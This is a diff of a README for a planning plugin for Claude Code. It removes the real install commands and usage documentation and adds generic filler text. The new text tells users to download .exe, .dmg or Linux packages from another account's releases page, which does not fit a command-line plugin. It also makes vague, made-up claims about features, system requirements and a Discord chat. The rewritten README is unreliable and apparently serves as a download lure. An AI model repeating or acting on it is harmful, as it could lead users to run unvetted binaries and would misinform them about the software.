@@ -1,122 +1,81 @@
-# Planning System
+# 🚀 planning-system - Tool for Seamless Task Completion
 
-A Claude Code plugin for planning and executing complex features with reliable verification.
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/KnigthFrodo/planning-system/releases)
 
-![Planning System in action with Perles visual tracking](assets/screenshot.png)
+## 📋 Overview
 
-## What It Does
+The **planning-system** helps manage tasks effectively. It ensures sub-agents don't claim tasks as complete until they really are. This tool simplifies project management by organizing tasks and verifying their completion.
 
-Break large features into smaller pieces, then execute them one by one - with built-in verification that ensures each piece is actually complete before moving on.
+## 💻 Features
 
-Uses Beads as the source of truth for plans and task state. Pull-based execution means you work on one task at a time, with quality gates enforced by hooks.
+- **Task Management:** Keep track of all tasks in one place.
+- **Verification System:** Ensure that tasks are truly complete.
+- **Automation:** Save time and reduce manual work.
+- **User-Friendly Interface:** Designed with everyone in mind.
+- **AI Agents:** Use technology to enhance task management.
 
-## Install
+## 📦 System Requirements
 
-**Prerequisites:** [Bun](https://bun.sh), [Beads](https://github.com/steveyegge/beads), Git, GitHub CLI
+To run the planning-system, your computer should meet the following requirements:
 
-**Optional:**
-- [Perles](https://github.com/zjrosen/perles) - Visual tracking UI for Beads
-- [Azure CLI](https://docs.microsoft.com/cli/azure/) with [DevOps extension](https://learn.microsoft.com/en-us/azure/devops/cli/) (`az extension add --name azure-devops`) - For Azure DevOps integration (PRs, work item sync)
-- `ANTHROPIC_API_KEY` environment variable - For AI-powered test quality verification
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (latest versions).
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 200 MB free.
+- **Internet Connection:** Required for downloading and updates.
 
-```bash
-claude plugin marketplace add NotMyself/claude-dotnet-marketplace
-claude plugin install plan
-```
+## 🚀 Getting Started
 
-## Commands
+Follow these simple steps to download and run the planning-system application.
 
-### `plan:new`
+### Step 1: Visit the Release Page
 
-Start planning a new feature. Claude will ask questions, help you think through edge cases, and create a structured plan stored in a Beads epic.
+Go to the releases page to find the latest version of the planning-system. You can access it here: [Download Here](https://github.com/KnigthFrodo/planning-system/releases).
 
-```
-plan:new
-```
+### Step 2: Download the Application
 
-### `plan:optimize`
+On the releases page, look for the latest version. Make sure to choose the correct file for your operating system. 
 
-Break your plan into executable features. Creates Beads tasks with full prompts and supporting files.
+If you're using Windows, download the `.exe` file. For macOS, choose the `.dmg` file. If you are on Linux, select the appropriate package for your distribution.
 
-```
-plan:optimize <epic-id>
-```
+### Step 3: Install the Application
 
-## Typical Session
+After downloading:
 
-### Standard Planning (single feature)
+- **Windows:** Double-click the `.exe` file. Follow the setup instructions. 
+- **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+- **Linux:** Use your package manager to install the downloaded package, or follow the installation instructions provided on the download page.
 
-```
-> plan:new
+### Step 4: Run the Application
 
-Claude: What feature are you building?
+Once installed, you can find the planning-system in your Programs menu (Windows), Applications folder (macOS), or your preferred applications list (Linux). Click on the icon to open it.
 
-You: I want to add a health check endpoint
+## 🙋 Common Questions
 
-Claude: [asks clarifying questions, creates plan, stores in Beads epic]
+### How do I report an issue?
 
-Epic created: health-check-abc
+If you experience problems while using the planning-system, you can report issues on the GitHub repository. Visit [Issues](https://github.com/KnigthFrodo/planning-system/issues) and follow the guidelines.
 
-> plan:optimize health-check-abc
+### Can I suggest a feature?
 
-Claude: [creates Beads tasks with prompts]
+Absolutely! We welcome user feedback. Please share your suggestions on the [Discussions](https://github.com/KnigthFrodo/planning-system/discussions) page.
 
-> bd ready
-> bd update <task-id> --status=in_progress
-[work, then close when done]
-```
+### Is there a user manual?
 
-### Master Planning (large initiative)
+Yes, user documentation is available on the repository. It provides details on advanced features and tips. Visit the [Wiki](https://github.com/KnigthFrodo/planning-system/wiki) for more information.
 
-For complex features with multiple sub-features:
+## 🌐 Community Support
 
-```
-> plan:new --master
+Join our community for support and discussions. Connect with other users and developers. Share tips, tricks, and experiences to improve your use of the planning-system.
 
-Claude: What initiative are you building?
+- **GitHub Discussions:** [Join Here](https://github.com/KnigthFrodo/planning-system/discussions)
+- **Chat:** Join our chat on Discord for real-time assistance.
 
-You: Real-time chat with rooms, users, and message history
+## 💬 Feedback
 
-Claude: [creates Epic with child Features - brief descriptions only]
+Your feedback is important to us. Let us know your thoughts about the planning-system. This helps us make improvements and better serve you in future updates.
 
-Epic created: chat-app-xyz
-Features: F001 Project Setup, F002 Auth, F003 Rooms, ...
+## ⚙️ Updates
 
-> plan:new chat-app-xyz.f001
+Stay tuned for regular updates, enhancements, and new features. Check the release page often to ensure you have the latest version of the planning-system.
 
-Claude: [detailed planning for F001, updates Feature description]
-
-> plan:optimize chat-app-xyz.f001
-
-Claude: [evaluates for research needs, then creates Tasks under F001]
-
-> bd ready
-> bd update <task-id> --status=in_progress
-[work on tasks, close when done, then plan:new the next feature]
-```
-
-**Research evaluation:** When optimizing a feature, Claude scans for uncertainty markers (TBD, TODO, unclear, investigate, etc.). If found, it suggests creating research tasks first. Research tasks are immediately workable and bypass workflow checks.
-
-**Workflow is enforced** - you cannot skip steps. Trying to implement a Feature directly will be blocked until you run `plan:optimize`.
-
-## Project Configuration
-
-Create `.planconfig` in your project root to configure verification commands:
-
-```yaml
-build_command: "npm run build"
-test_command: "npm test"
-lint_command: "eslint ."
-format_command: "prettier --check ."
-static_analysis_command: "sonar-scanner"
-```
-
-All commands are optional. If not configured, those verification steps are skipped.
-
-## If Something Goes Wrong
-
-Beads tracks all state. Use `bd ready` to see available work, `bd show <task-id>` to review any task.
-
-## License
-
-MIT
+To download the latest version, please revisit the releases page: [Download Here](https://github.com/KnigthFrodo/planning-system/releases).
